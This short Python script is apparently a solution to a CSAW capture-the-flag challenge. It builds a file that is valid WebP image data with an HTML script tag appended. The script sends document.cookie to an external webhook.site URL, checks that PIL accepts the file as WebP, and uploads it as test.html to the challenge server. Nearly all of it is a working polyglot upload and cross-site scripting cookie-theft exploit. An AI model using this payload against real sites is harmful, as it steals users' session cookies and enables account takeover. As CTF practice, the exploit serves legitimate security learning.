from PIL import Image
import io

# test = Image.new('RGB', (1, 1))

# test.save('test.webp')

# data = open('test.webp', 'rb').read()
# print(data)

data = b'RIFF$\x00\x00\x00WEBPVP8 \x18\x00\x00\x000\x01\x00\x9d\x01*\x01\x00\x01\x00\x01@&%\xa4\x00\x03p\x00\xfe\xfd6h\x00<div><script>fetch("https://webhook.site/ef910ccf-1744-4253-bc79-4f51fc87a341?"+document.cookie)</script></div>'

with Image.open(io.BytesIO(data)) as img:
    print(img.format)

import requests

url = "http://polyglot.ctf.csaw.io:4747/upload_blog_post"

form = {
    'post_title': 'test',
    'post_body': 'test',
    'script_pack': 'test'
}

r = requests.post(url, files={'file': ('test.html', data)}, data=form)

print(r.text)
